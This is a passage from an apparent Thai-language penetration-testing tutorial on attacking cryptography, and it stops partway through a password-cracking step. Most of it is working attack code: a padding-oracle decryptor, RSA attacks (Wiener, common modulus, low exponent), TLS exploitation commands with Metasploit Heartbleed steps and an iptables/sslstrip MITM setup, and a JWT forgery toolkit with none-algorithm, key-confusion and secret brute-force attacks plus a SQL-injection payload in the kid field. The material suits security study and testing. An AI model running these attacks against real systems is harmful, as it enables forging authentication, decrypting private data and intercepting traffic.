# Part 37: Cryptography Attacks (Steps 361-370)

## Step 361: Cryptographic Fundamentals และ Common Weaknesses

ความรู้พื้นฐานเกี่ยวกับ cryptography และจุดอ่อนสำหรับ pen testers

```python
#!/usr/bin/env python3
# crypto_fundamentals.py - Cryptography Attack Overview

from Crypto.Cipher import AES, DES, DES3
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from Crypto.Hash import MD5, SHA1, SHA256, HMAC
import hashlib
import base64
import os
import struct

# ========== Weak Encryption Examples ==========

class WeakEncryptionDemo:
    """Shows common weak encryption implementations"""
    
    def ecb_mode_weakness(self):
        """ECB mode leaks patterns"""
        key = b'This is a key123'
        cipher = AES.new(key, AES.MODE_ECB)
        
        # ข้อความที่มี pattern ซ้ำ
        plaintext = b'AAAAAAAAAAAAAAAA' + b'BBBBBBBBBBBBBBBB' + b'AAAAAAAAAAAAAAAA'
        ciphertext = cipher.encrypt(plaintext)
        
        # block 0 == block 2 -> บอกแพทเริน
        block0 = ciphertext[0:16]
        block1 = ciphertext[16:32]
        block2 = ciphertext[32:48]
        
        print(f"ECB Demo:")
        print(f"  Block 0: {block0.hex()}")
        print(f"  Block 1: {block1.hex()}")
        print(f"  Block 2: {block2.hex()}")
        print(f"  Block 0 == Block 2: {block0 == block2}")
        print("  => Pattern leaked!")
    
    def static_iv_weakness(self):
        """Static IV in CBC mode"""
        key = b'This is a key123'
        iv = b'\x00' * 16  # Static IV! Never do this
        
        plaintext1 = b'Secret message 1'
        plaintext2 = b'Secret message 1'  # Same plaintext
        
        cipher1 = AES.new(key, AES.MODE_CBC, iv)
        ct1 = cipher1.encrypt(plaintext1)
        
        cipher2 = AES.new(key, AES.MODE_CBC, iv)
        ct2 = cipher2.encrypt(plaintext2)
        
        print(f"\nStatic IV Demo:")
        print(f"  Ciphertext 1: {ct1.hex()}")
        print(f"  Ciphertext 2: {ct2.hex()}")
        print(f"  Same: {ct1 == ct2}")
        print("  => Same plaintext produces same ciphertext!")
    
    def weak_rng(self):
        """Weak random number generation"""
        import random  # Weak! Don't use for crypto
        
        # predictable seed
        random.seed(12345)
        weak_key = bytes([random.randint(0, 255) for _ in range(16)])
        
        # ควรใช้
        strong_key = get_random_bytes(16)
        
        print(f"\nRNG Demo:")
        print(f"  Weak key (predictable): {weak_key.hex()}")
        print(f"  Strong key (secure): {strong_key.hex()}")
    
    def short_key_attack(self):
        """56-bit DES is crackable"""
        # DES = 56-bit key = only 2^56 = 72 quadrillion combinations
        # Modern GPUs can crack in hours
        print("\nShort Key Demo:")
        print("  DES: 56-bit key -> Cracakble by modern hardware")
        print("  RC4: Known biases, avoid for new applications")
        print("  MD5/SHA1 for passwords: Collision attacks possible")


# ========== Hash Analysis ==========

class HashAttacks:
    def length_extension_attack(self, original_msg: bytes, original_hash: str, append: bytes):
        """โจมตี SHA-1/SHA-256 length extension attack"""
        # ใช้ hashpump tool: hashpump -s <hash> -d <data> -a <append> -k <key_len>
        print("Length Extension Attack:")
        print(f"  Original message: {original_msg}")
        print(f"  Original hash: {original_hash}")
        print(f"  Appended data: {append}")
        print("  Tool: hashpump -s <hash> -d <original_data> -a <append_data> -k <key_length>")
        print("  Tool: hash_extender --data <data> --secret <len> --append <str> --signature <hash>")
    
    def hash_collision_demo(self):
        """MD5 collision example"""
        # MD5 ตัวอย่าง collision pair (known)
        msg1 = bytes.fromhex(
            "d131dd02c5e6eec4693d9a0698aff95c"
            "2fcab58712467eab4004583eb8fb7f89"
            "55ad340609f4b30283e488832571415a"
            "085125e8f7cdc99fd91dbdf280373c5b"
            "d8823e3156348f5bae6dacd436c919c6"
            "dd53e2b487da03fd02396306d248cda0"
            "e99f33420f577ee8ce54b67080a80d1e"
            "c69821bcb6a8839396f9652b6ff72a70"
        )
        
        msg2 = bytes.fromhex(
            "d131dd02c5e6eec4693d9a0698aff95c"
            "2fcab50712467eab4004583eb8fb7f89"
            "55ad340609f4b30283e4888325f1415a"
            "085125e8f7cdc99fd91dbdf280373c5b"
            "d8823e3156348f5bae6dacd436c919c6"
            "dd53e23487da03fd02396306d248cda0"
            "e99f33420f577ee8ce54b67080280d1e"
            "c69821bcb6a8839396f965ab6ff72a70"
        )
        
        hash1 = hashlib.md5(msg1).hexdigest()
        hash2 = hashlib.md5(msg2).hexdigest()
        
        print(f"\nMD5 Collision Demo:")
        print(f"  Hash 1: {hash1}")
        print(f"  Hash 2: {hash2}")
        print(f"  Collision: {hash1 == hash2}")
    
    def rainbow_table_demo(self):
        """Rainbow table lookup"""
        # Common passwords and their hashes
        common_hashes = {
            "5f4dcc3b5aa765d61d8327deb882cf99": "password",
            "e10adc3949ba59abbe56e057f20f883e": "123456",
            "25f9e794323b453885f5181f1b624d0b": "123456789",
            "25d55ad283aa400af464c76d713c07ad": "12345678",
            "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty"
        }
        
        test_hash = hashlib.md5(b"password").hexdigest()
        print(f"\nRainbow Table Demo:")
        print(f"  Target hash: {test_hash}")
        if test_hash in common_hashes:
            print(f"  Found in rainbow table: {common_hashes[test_hash]}")
        
        print("  Tools: ophcrack, hashcat, crackstation.net")


if __name__ == "__main__":
    demo = WeakEncryptionDemo()
    demo.ecb_mode_weakness()
    demo.static_iv_weakness()
    demo.weak_rng()
    demo.short_key_attack()
    
    attacks = HashAttacks()
    attacks.hash_collision_demo()
    attacks.rainbow_table_demo()
```

## Step 362: Padding Oracle Attack

การโจมตี CBC padding oracle เพื่อ decrypt ciphertext

```python
#!/usr/bin/env python3
# padding_oracle.py - Padding Oracle Attack

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64

# ========== Vulnerable Server Simulation ==========

class VulnerableServer:
    """Server with CBC padding oracle vulnerability"""
    
    def __init__(self):
        self.key = get_random_bytes(16)
        self.iv = get_random_bytes(16)
    
    def encrypt(self, plaintext: bytes) -> tuple:
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        ct = cipher.encrypt(pad(plaintext, 16))
        return self.iv, ct
    
    def decrypt_and_check_padding(self, iv: bytes, ciphertext: bytes) -> bool:
        """Returns True if padding is valid - THIS IS THE ORACLE"""
        try:
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            plaintext = cipher.decrypt(ciphertext)
            unpad(plaintext, 16)  # ถ้า padding ผิด -> ValueError
            return True  # Valid padding
        except ValueError:
            return False  # Invalid padding


class PaddingOracleAttack:
    """Implements Padding Oracle Attack against CBC mode"""
    
    def __init__(self, oracle_func):
        """
        oracle_func: function(iv, ciphertext) -> bool
        Returns True if padding is valid
        """
        self.oracle = oracle_func
        self.block_size = 16
    
    def decrypt_block(self, prev_block: bytes, target_block: bytes) -> bytes:
        """
        Decrypt a single ciphertext block
        prev_block: previous ciphertext block (or IV for first block)
        target_block: ciphertext block to decrypt
        """
        # intermediate bytes (after block cipher decryption, before XOR with prev_block)
        intermediate = bytearray(self.block_size)
        # recovered plaintext
        plaintext = bytearray(self.block_size)
        
        # Attack each byte from right to left
        for byte_idx in range(self.block_size - 1, -1, -1):
            pad_byte = self.block_size - byte_idx  # Padding value we're targeting
            
            # Craft modified previous block
            modified_prev = bytearray(self.block_size)
            
            # Set already-recovered bytes to produce desired padding
            for j in range(byte_idx + 1, self.block_size):
                modified_prev[j] = intermediate[j] ^ pad_byte
            
            # Try all 256 values for current byte
            found = False
            for guess in range(256):
                modified_prev[byte_idx] = guess
                
                # Test against oracle
                if self.oracle(bytes(modified_prev), target_block):
                    # Valid padding! Calculate intermediate byte
                    intermediate[byte_idx] = guess ^ pad_byte
                    # Calculate plaintext byte
                    plaintext[byte_idx] = intermediate[byte_idx] ^ prev_block[byte_idx]
                    found = True
                    break
            
            if not found:
                # No valid padding found (shouldn't happen)
                print(f"  Warning: No valid padding found for byte {byte_idx}")
        
        return bytes(plaintext)
    
    def decrypt(self, iv: bytes, ciphertext: bytes) -> bytes:
        """Decrypt entire ciphertext"""
        print(f"[*] Padding Oracle Attack starting...")
        print(f"[*] Ciphertext length: {len(ciphertext)} bytes ({len(ciphertext)//16} blocks)")
        
        plaintext = b""
        blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
        prev_block = iv
        
        for block_num, block in enumerate(blocks):
            print(f"[*] Decrypting block {block_num + 1}/{len(blocks)}...")
            decrypted_block = self.decrypt_block(prev_block, block)
            plaintext += decrypted_block
            prev_block = block
        
        # Remove padding
        try:
            return unpad(plaintext, 16)
        except:
            return plaintext


# ========== Practical Example ==========

def padding_oracle_demo():
    print("=== Padding Oracle Attack Demo ===")
    
    # Setup vulnerable server
    server = VulnerableServer()
    
    # Encrypt secret message
    secret = b"Secret admin token: ADMIN_TOKEN_12345"
    iv, ciphertext = server.encrypt(secret)
    
    print(f"[*] Intercepted ciphertext: {base64.b64encode(iv + ciphertext).decode()}")
    print(f"[*] Attacker doesn't know key but has oracle access")
    
    # Create oracle function
    oracle = lambda iv, ct: server.decrypt_and_check_padding(iv, ct)
    
    # Attack!
    attacker = PaddingOracleAttack(oracle)
    
    print("\n[*] Starting attack...")
    recovered = attacker.decrypt(iv, ciphertext)
    
    print(f"\n[+] Recovered plaintext: {recovered}")
    print(f"[+] Match: {recovered == secret}")


# ========== Detection และ Prevention ==========

PREVENTION = """
Prevention:
1. ใช้ AES-GCM, AES-CCM (Authenticated Encryption)
2. Implement HMAC-then-Encrypt หรือ Encrypt-then-MAC
3. Return generic error messages (don't distinguish padding errors)
4. Implement rate limiting on decryption attempts
5. Use TLS 1.3 (mitigates POODLE, BEAST)
6. Upgrade from CBC to GCM mode

Detection:
1. Monitor for large number of decryption requests
2. Alert on requests with systematically modified ciphertexts
3. Rate limiting on decryption endpoints

Tools:
- PadBuster: padBuster.pl <url> <sample> <blocksize>
- Padbuster Python: python3 padBuster.py <url> <ciphertext> 16
- POET: Padding Oracle Exploitation Tool
- PolyGlot: Tool for PKCS#7 padding oracle

Example with padbuster:
python3 padBuster.py http://target.com/decrypt \
  "Base64EncodedCiphertext==" 16 \
  -cookie "auth=Base64EncodedCiphertext=="
"""

if __name__ == "__main__":
    padding_oracle_demo()
    print(PREVENTION)
```

## Step 363: RSA Attacks

การโจมตีระบบ RSA ที่มีการตั้งค่าผิดพลาด

```python
#!/usr/bin/env python3
# rsa_attacks.py - RSA Cryptanalysis

import math
import sympy
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP
from Crypto.Random import get_random_bytes
import base64

# ========== RSA Factoring ==========

class RSAAttacks:
    
    def small_prime_factoring(self, n: int) -> tuple:
        """Trial division for small primes"""
        print(f"[*] Attempting to factor N={n} by trial division...")
        
        for p in range(2, min(1000000, int(n**0.5) + 1)):
            if n % p == 0:
                q = n // p
                print(f"[+] Factored! p={p}, q={q}")
                return p, q
        
        print("[-] Could not factor by trial division")
        return None, None
    
    def fermat_factoring(self, n: int) -> tuple:
        """Fermat factoring - works when p, q are close together"""
        print(f"[*] Fermat factoring N={n}...")
        
        a = math.isqrt(n) + 1
        b2 = a * a - n
        
        for _ in range(10000):
            b = math.isqrt(b2)
            if b * b == b2:
                p = a - b
                q = a + b
                if p * q == n:
                    print(f"[+] Factored! p={p}, q={q}")
                    return p, q
            a += 1
            b2 = a * a - n
        
        print("[-] Fermat factoring failed")
        return None, None
    
    def wiener_attack(self, e: int, n: int) -> int:
        """Wiener's attack - when d is small"""
        print(f"[*] Wiener's attack (small d)...")
        
        # Continued fraction expansion of e/n
        def continued_fraction(numerator, denominator):
            fractions = []
            while denominator:
                fractions.append(numerator // denominator)
                numerator, denominator = denominator, numerator % denominator
            return fractions
        
        def convergents(cf):
            convs = []
            for i in range(len(cf)):
                if i == 0:
                    convs.append((cf[0], 1))
                elif i == 1:
                    convs.append((cf[0] * cf[1] + 1, cf[1]))
                else:
                    h_prev, k_prev = convs[i-1]
                    h_prev2, k_prev2 = convs[i-2]
                    convs.append((
                        cf[i] * h_prev + h_prev2,
                        cf[i] * k_prev + k_prev2
                    ))
            return convs
        
        cf = continued_fraction(e, n)
        convs = convergents(cf)
        
        for k, d in convs:
            if k == 0:
                continue
            
            # Check if d is valid private key
            # phi = (e*d - 1) / k
            if (e * d - 1) % k == 0:
                phi = (e * d - 1) // k
                
                # Solve x^2 - (n - phi + 1)x + n = 0
                b = n - phi + 1
                discriminant = b * b - 4 * n
                
                if discriminant > 0:
                    sqrt_disc = math.isqrt(discriminant)
                    if sqrt_disc * sqrt_disc == discriminant:
                        p = (b + sqrt_disc) // 2
                        q = (b - sqrt_disc) // 2
                        if p * q == n:
                            print(f"[+] Wiener's attack succeeded! d={d}")
                            return d
        
        print("[-] Wiener's attack failed (d is not small)")
        return None
    
    def common_modulus_attack(self, n: int, e1: int, e2: int, 
                               c1: int, c2: int) -> int:
        """Common modulus attack - same n, different e, same plaintext"""
        print("[*] Common modulus attack...")
        
        # Extended Euclidean Algorithm
        def extended_gcd(a, b):
            if a == 0:
                return b, 0, 1
            gcd, x1, y1 = extended_gcd(b % a, a)
            return gcd, y1 - (b // a) * x1, x1
        
        gcd, a, b = extended_gcd(e1, e2)
        
        if gcd != 1:
            print("[-] GCD != 1, attack may fail")
            return None
        
        # m = c1^a * c2^b mod n
        if a < 0:
            a = -a
            c1 = pow(c1, -1, n)  # Modular inverse
        if b < 0:
            b = -b
            c2 = pow(c2, -1, n)
        
        m = (pow(c1, a, n) * pow(c2, b, n)) % n
        print(f"[+] Recovered plaintext integer: {m}")
        return m
    
    def small_exponent_attack(self, ciphertexts: list, n_list: list, e: int = 3):
        """Low exponent attack (e=3) with multiple recipients"""
        print(f"[*] Small exponent attack (e={e})...")
        
        if len(ciphertexts) < e or len(n_list) < e:
            print("[-] Need at least e ciphertexts")
            return None
        
        # CRT to recover m^e
        from functools import reduce
        
        # Chinese Remainder Theorem
        N = reduce(lambda a, b: a * b, n_list[:e])
        
        x = 0
        for i in range(e):
            Ni = N // n_list[i]
            Mi = pow(Ni, -1, n_list[i])  # Modular inverse
            x = (x + ciphertexts[i] * Ni * Mi) % N
        
        # Now x = m^e, take e-th root
        m = sympy.integer_nthroot(x, e)[0]
        print(f"[+] Recovered message: {m}")
        return m
    
    def pkcs1_v15_bleichenbacher(self):
        """Bleichenbacher's PKCS#1 v1.5 attack (conceptual)"""
        print("\nBleichenbacher's Attack (PKCS#1 v1.5):")
        print("  1. Oracle: server tells if decrypted message starts with 0x0002")
        print("  2. Send modified ciphertext, observe padding error vs other error")
        print("  3. Binary search on plaintext using ~1M queries")
        print("  4. Eventually recover full plaintext")
        print("  Prevention: Use OAEP padding (PKCS#1 v2.0+)")
        print("  Tool: ROBOT attack scanner: https://robotattack.org/")


# ========== Factorization with online tools ==========

FACTORIZATION_TOOLS = """
# Online factorization databases

# factordb.com - database of factored numbers
curl "http://factordb.com/api?query=<N>"

# ใช้ msieve
msieve -v -s -l log.txt <N>

# ใช้ yafu
yafu "factor(<N>)"

# ใช้ SageMath
sage -c "print(factor(<N>))"

# Python ด้วย sympy
python3 -c "from sympy import factorint; print(factorint(<N>))"

# RsaCtfTool - สำหรับ CTF
git clone https://github.com/Ganapati/RsaCtfTool
python3 RsaCtfTool.py --publickey key.pem --private
python3 RsaCtfTool.py --publickey key.pem --uncipherfile cipher.txt
python3 RsaCtfTool.py -n <N> -e <e> --private

# Generate weak RSA key สำหรับ testing
openssl genrsa -out weak.pem 512
openssl rsa -in weak.pem -text -noout
"""

if __name__ == "__main__":
    attacker = RSAAttacks()
    
    # Demo ด้วย small numbers
    # Small prime factoring
    attacker.small_prime_factoring(3233)  # 3233 = 61 * 53
    
    # Wiener's attack demo
    # e = 17993, n = 90581 (d is small)
    attacker.wiener_attack(17993, 90581)
    
    print(FACTORIZATION_TOOLS)
```

## Step 364: TLS/SSL Attacks

การทดสอบและโจมตี TLS/SSL implementations

```bash
#!/bin/bash
# tls_ssl_attacks.sh - TLS/SSL Security Testing

# ========== TLS Scanning ==========

scan_tls() {
    local target=$1
    local port=${2:-443}
    
    echo "[*] TLS Security Scan: $target:$port"
    
    # testssl.sh - comprehensive TLS scanner
    testssl.sh --severity MEDIUM \
        --protocols \
        --cipher-per-proto \
        --server-defaults \
        --server-preference \
        --vulnerable \
        $target:$port
    
    # SSLyze
    sslyze --regular $target:$port
    
    # OpenSSL manual checks
    # ตรวจสอป SSL 3.0 (POODLE)
    openssl s_client -connect $target:$port -ssl3 2>&1 | head -5
    
    # ตรวจสอบ TLS 1.0 (BEAST)
    openssl s_client -connect $target:$port -tls1 2>&1 | head -5
    
    # ตรวจสอบ weak ciphers
    nmap --script ssl-enum-ciphers -p $port $target
}

# ========== Specific TLS Attacks ==========

# POODLE Attack (SSLv3)
test_poodle() {
    local target=$1
    local port=${2:-443}
    
    echo "[*] Testing POODLE (CVE-2014-3566)..."
    # แค่เช็คว่า SSLv3 เปิดอยู่หรือไม่
    result=$(openssl s_client -connect $target:$port -ssl3 2>&1)
    if echo "$result" | grep -q "CONNECTED"; then
        echo "  [-] VULNERABLE: SSLv3 enabled!"
    else
        echo "  [+] NOT VULNERABLE: SSLv3 disabled"
    fi
}

# HEARTBLEED (CVE-2014-0160)
test_heartbleed() {
    local target=$1
    local port=${2:-443}
    
    echo "[*] Testing Heartbleed (CVE-2014-0160)..."
    
    # Using nmap script
    nmap -p $port --script ssl-heartbleed $target
    
    # Using python script
    # python3 heartbleed.py -p $port $target
    
    # Using Metasploit
    echo "Metasploit:"
    echo "  use auxiliary/scanner/ssl/openssl_heartbleed"
    echo "  set RHOSTS $target"
    echo "  set RPORT $port"
    echo "  set VERBOSE true"
    echo "  run"
}

# BEAST Attack (CBC in TLS 1.0)
test_beast() {
    local target=$1
    
    echo "[*] Testing BEAST (TLS 1.0 + CBC)..."
    nmap --script ssl-enum-ciphers -p 443 $target | grep -E "TLSv1.0|TLS_.*CBC"
}

# CRIME/BREACH (compression attacks)
test_crime() {
    local target=$1
    
    echo "[*] Testing CRIME (TLS compression)..."
    openssl s_client -connect $target:443 2>&1 | grep "Compression"
    # "Compression: NONE" is good
    # "Compression: zlib compression" is vulnerable
}

# DROWN Attack (SSLv2)
test_drown() {
    local target=$1
    
    echo "[*] Testing DROWN (CVE-2016-0800)..."
    # Check if SSLv2 is enabled anywhere
    openssl s_client -connect $target:443 -ssl2 2>&1 | head
    # Check port 25 (SMTP), 110 (POP3), etc. for SSLv2
    nmap -p 443 --script ssl-dh-params $target  # Check for LOGJAM too
}

# LOGJAM Attack (weak DH)
test_logjam() {
    local target=$1
    
    echo "[*] Testing LOGJAM (CVE-2015-4000)..."
    nmap --script ssl-dh-params -p 443 $target
    # Look for: "LOGJAM: Vulnerable" or DH params < 2048 bits
}

# ROBOT Attack (Return of Bleichenbacher Oracle Threat)
test_robot() {
    local target=$1
    
    echo "[*] Testing ROBOT attack..."
    # git clone https://github.com/robotattack/robot-detect
    # python3 robot-detect/robotattack.py $target
    nmap --script ssl-poodle -p 443 $target
}

# ========== Certificate Analysis ==========

analyze_certificate() {
    local target=$1
    local port=${2:-443}
    
    echo "[*] Analyzing certificate: $target:$port"
    
    # Get certificate
    openssl s_client -connect $target:$port -showcerts 2>/dev/null < /dev/null | \
        openssl x509 -noout -text 2>/dev/null
    
    # Check expiry
    openssl s_client -connect $target:$port 2>/dev/null < /dev/null | \
        openssl x509 -noout -dates 2>/dev/null
    
    # Check SANs
    openssl s_client -connect $target:$port 2>/dev/null < /dev/null | \
        openssl x509 -noout -ext subjectAltName 2>/dev/null
    
    # Check key size
    openssl s_client -connect $target:$port 2>/dev/null < /dev/null | \
        openssl x509 -noout -pubkey 2>/dev/null | \
        openssl pkey -noout -text 2>/dev/null
    
    # ตรวจสอบ certificate pinning bypass
    echo "\nCertificate Pinning Bypass (Mobile):"  
    echo "  frida -U -l ssl-kill-switch2.js <AppName>"
    echo "  Objection: objection -g <package> explore -s 'android sslpinning disable'"
}

# ========== MITM TLS Interception ==========

setup_mitm_ssl() {
    echo "[*] Setting up SSL MITM with mitmproxy..."
    
    # mitmproxy
    mitmproxy -p 8080 &
    
    # iptables redirect
    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
    iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
    
    # Install mitmproxy CA cert
    echo "Install CA cert from http://mitm.it on target device"
    
    # SSLstrip2
    # ใช้ sslstrip สำหรับ downgrade HTTPS->HTTP
    # sslstrip -l 8080
    # arpspoof -i eth0 -t <victim> <gateway>
}

if [ "$1" == "--help" ]; then
    echo "Usage:"
    echo "  scan_tls <target> [port]"
    echo "  test_heartbleed <target> [port]"
    echo "  test_poodle <target> [port]"
    echo "  analyze_certificate <target> [port]"
fi
```

## Step 365: JWT Attacks

การโจมตี JSON Web Token อย่างต่างๆ

```python
#!/usr/bin/env python3
# jwt_attacks.py - JWT Security Testing

import json
import base64
import hmac
import hashlib
import struct
from datetime import datetime, timedelta

# pip install pyjwt cryptography
try:
    import jwt
except ImportError:
    print("Install pyjwt: pip install pyjwt[cryptography]")

class JWTAttacks:
    def __init__(self, token: str):
        self.token = token
        self.header, self.payload, self.signature = self._parse_token()
    
    def _b64_decode(self, data: str) -> bytes:
        """Base64url decode with padding"""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)
    
    def _b64_encode(self, data: bytes) -> str:
        """Base64url encode without padding"""
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
    
    def _parse_token(self) -> tuple:
        parts = self.token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        
        header = json.loads(self._b64_decode(parts[0]))
        payload = json.loads(self._b64_decode(parts[1]))
        signature = parts[2]
        
        return header, payload, signature
    
    def decode_token(self, verify: bool = False) -> dict:
        """Decode JWT without verification"""
        print(f"[*] JWT Header: {json.dumps(self.header, indent=2)}")
        print(f"[*] JWT Payload: {json.dumps(self.payload, indent=2)}")
        return {"header": self.header, "payload": self.payload}
    
    def none_algorithm_attack(self) -> str:
        """โจมตี 'alg: none' - bypass signature verification"""
        print("[*] None algorithm attack...")
        
        # แก้ header เป็น none
        new_header = dict(self.header)
        new_header['alg'] = 'none'
        
        # สร้าง token ใหม่ไม่มี signature
        header_encoded = self._b64_encode(json.dumps(new_header, separators=(',', ':')).encode())
        payload_encoded = self._b64_encode(json.dumps(self.payload, separators=(',', ':')).encode())
        
        forged_token = f"{header_encoded}.{payload_encoded}."
        print(f"[+] Forged token (none alg): {forged_token[:80]}...")
        return forged_token
    
    def algorithm_confusion_attack(self, public_key: str) -> str:
        """โจมตี RS256 -> HS256 (use public key as HMAC secret)"""
        print("[*] Algorithm confusion attack (RS256 -> HS256)...")
        
        new_header = dict(self.header)
        new_header['alg'] = 'HS256'
        
        # Sign with public key as HMAC secret
        header_encoded = self._b64_encode(json.dumps(new_header, separators=(',', ':')).encode())
        payload_encoded = self._b64_encode(json.dumps(self.payload, separators=(',', ':')).encode())
        
        message = f"{header_encoded}.{payload_encoded}"
        signature = hmac.new(
            public_key.encode() if isinstance(public_key, str) else public_key,
            message.encode(),
            hashlib.sha256
        ).digest()
        
        sig_encoded = self._b64_encode(signature)
        forged_token = f"{header_encoded}.{payload_encoded}.{sig_encoded}"
        
        print(f"[+] Forged token (HS256 with pubkey): {forged_token[:80]}...")
        return forged_token
    
    def claim_manipulation(self, claim: str, value) -> str:
        """Modify JWT claims (requires valid signature or none alg)"""
        print(f"[*] Modifying claim '{claim}' to '{value}'...")
        
        new_payload = dict(self.payload)
        new_payload[claim] = value
        
        # Modify role
        if 'role' in new_payload:
            new_payload['role'] = 'admin'
            print(f"[+] Escalated role to admin")
        if 'isAdmin' in new_payload:
            new_payload['isAdmin'] = True
        if 'user_id' in new_payload:
            new_payload['user_id'] = 1
        
        return new_payload
    
    def brute_force_secret(self, wordlist: list = None) -> str:
        """Brute force weak HMAC secret"""
        print("[*] Brute forcing JWT secret...")
        
        if wordlist is None:
            wordlist = [
                "secret", "password", "key", "jwt", "admin",
                "supersecret", "your-256-bit-secret", "changeme",
                "secret123", "mysecretkey", "1234567890"
            ]
        
        header_payload = '.'.join(self.token.split('.')[:2])
        expected_sig = self._b64_decode(self.signature)
        
        for secret in wordlist:
            test_sig = hmac.new(
                secret.encode(),
                header_payload.encode(),
                hashlib.sha256
            ).digest()
            
            if test_sig == expected_sig:
                print(f"[+] Secret found: '{secret}'")
                return secret
        
        print("[-] Secret not found in wordlist")
        print("    Use hashcat: hashcat -a 0 -m 16500 token.txt wordlist.txt")
        return None
    
    def kid_injection(self, kid_payload: str = "secret") -> str:
        """Key ID (kid) injection attack"""
        print("[*] kid injection attack...")
        
        new_header = dict(self.header)
        
        # SQL injection via kid
        new_header['kid'] = "' UNION SELECT 'attacker_key' FROM dual --"
        # OS command injection via kid (if system() called)
        # new_header['kid'] = "/dev/null; echo 'attacker_key' #"
        # Directory traversal via kid
        # new_header['kid'] = "../../../../../../dev/null"
        
        print(f"[+] Injected kid: {new_header['kid']}")
        return new_header
    
    def jku_jwks_injection(self, attacker_url: str) -> str:
        """โจมตี jku/x5u header pointing to attacker's JWKS"""
        print("[*] jku/x5u injection attack...")
        
        new_header = dict(self.header)
        new_header['jku'] = attacker_url  # JWKS URL
        # new_header['x5u'] = attacker_url  # X.509 cert URL
        
        print(f"[+] Injected jku: {attacker_url}")
        print(f"[*] Host attacker JWKS at: {attacker_url}")
        
        # Generate RSA key pair for forging
        print("[*] Commands to generate attacker JWKS:")
        print("    openssl genrsa -out attacker.pem 2048")
        print("    openssl rsa -in attacker.pem -pubout -out attacker_pub.pem")
        print("    # Convert to JWKS format and host at attacker_url")
        
        return new_header


# Hashcat JWT cracking
HASHCAT_JWT = """
# JWT brute force with hashcat

# Copy JWT token to file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.sig" > jwt.txt

# Hashcat mode 16500 = JWT
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 16500 jwt.txt '?a?a?a?a?a?a'  # Brute 6 chars

# jwt_tool for comprehensive testing
pip install jwt_tool
jwt_tool <token>                          # Decode
jwt_tool <token> -X a                    # None algorithm
jwt_tool <token> -X s                    # HS256 with public key
jwt_tool <token> -C -d wordlist.txt      # Crack secret
jwt_tool <token> -T                      # Tamper claims interactively
jwt_tool <token> -X i -ju <url>          # jku injection
jwt_tool <token> -pc role -pv admin      # Tamper specific claim
"""

if __name__ == "__main__":
    # Sample JWT token (unsigned, for demo)
    sample_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    attacker = JWTAttacks(sample_token)
    attacker.decode_token()
    attacker.none_algorithm_attack()
    attacker.brute_force_secret()
    
    print(HASHCAT_JWT)
```

## Step 366: Password Hashing Attacks

เทคนิคการโจมตี password hashing algorithms

```python
#!/usr/bin/env python3
# password_hash_attacks.py - Password Hash Cracking

import hashlib
import hmac
import itertools
import string
from passlib.hash import bcrypt, scrypt, argon2

class PasswordHashCracker:
    def __init__(self):
        self.cracked = {}
        
    def identify_hash(self, hash_string: str) -> str:
        """Identify hash type from format"""
        hash_string = hash_string.strip()
        
        patterns = {
            "MD5": (32, r'^[a-f0-9]{32}$'),
            "SHA-1": (40, r'^[a-f0-9]{40}$'),
            "SHA-256": (64, r'^[a-f0-9]{64}$'),
            "SHA-512": (128, r'^[a-f0-9]{128}$'),
            "bcrypt": (0, r'^\$2[aby]\$'),
            "MD5 crypt": (0, r'^\$1\$'),
            "SHA-256 crypt": (0, r'^\$5\$'),
            "SHA-512 crypt": (0, r'^\$6\$'),
            "NTLM": (32, r'^[A-F0-9]{32}$'),
            "MySQL4": (16, r'^[a-f0-9]{16}$'),
            "Argon2": (0, r'^\$argon2'),
            "scrypt": (0, r'^\$s0\$'),
            "LM Hash": (0, r'^[A-F0-9]{32}:[A-F0-9]{32}$')
        }
        
        import re
        for hash_type, (length, pattern) in patterns.items():
            if re.match(pattern, hash_string, re.IGNORECASE):
                return hash_type
        
        return "Unknown"
    
    def crack_md5_dictionary(self, hash_value: str, wordlist_file: str) -> str:
        """Dictionary attack on MD5"""
        print(f"[*] Dictionary attack on MD5: {hash_value}")
        
        with open(wordlist_file, 'r', errors='ignore') as f:
            for word in f:
                word = word.strip()
                if hashlib.md5(word.encode()).hexdigest() == hash_value.lower():
                    print(f"[+] Cracked! {hash_value} = '{word}'")
                    return word
        
        print("[-] Not cracked")
        return None
    
    def crack_ntlm_rule_attack(self, hash_value: str, wordlist: list) -> str:
        """Rule-based attack on NTLM"""
        print(f"[*] Rule-based attack on NTLM: {hash_value}")
        
        def ntlm_hash(password: str) -> str:
            return hashlib.new('md4', password.encode('utf-16-le')).hexdigest()
        
        def apply_rules(word: str) -> list:
            variants = [word]
            variants.append(word.upper())
            variants.append(word.lower())
            variants.append(word.capitalize())
            variants.append(word + "1")
            variants.append(word + "123")
            variants.append(word + "!")
            variants.append(word + "2024")
            variants.append(word.replace('e', '3').replace('a', '@').replace('i', '1'))
            return variants
        
        for base_word in wordlist:
            for variant in apply_rules(base_word):
                if ntlm_hash(variant) == hash_value.upper():
                    print(f"[+] Cracked NTLM: '{variant}'")
                    return variant
        
        return None
    
    def crack_salted_sha256(self, hash_with_salt: str, wordlist: list) -> str:
        """Crack salted SHA-256: salt:hash or hash:salt"""
        parts = hash_with_salt.split(':')
        if len(parts) != 2:
            return None
        
        # Try both orderings
